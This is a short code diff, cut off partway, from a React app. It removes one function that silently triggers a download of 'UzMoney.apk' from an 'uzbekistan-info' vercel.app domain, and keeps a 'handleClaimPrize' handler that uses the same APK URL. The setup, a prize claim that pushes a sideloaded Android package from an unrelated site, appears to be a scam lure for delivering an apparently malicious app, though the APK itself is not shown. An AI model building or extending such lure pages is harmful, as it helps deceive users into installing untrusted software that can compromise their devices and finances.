@@ -1,17 +1,7 @@
 import React from 'react';
 
 export default function App() {
-  const handleDownload = (e) => {
-    e.preventDefault();
-    const link = document.createElement('a');
-    // Используем оригинальный URL для скачивания
-    link.href = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
-    link.download = 'UzMoney.apk';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  };
-         const handleClaimPrize = (e) => {
+  const handleClaimPrize = (e) => {
     e.preventDefault();
 
     const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
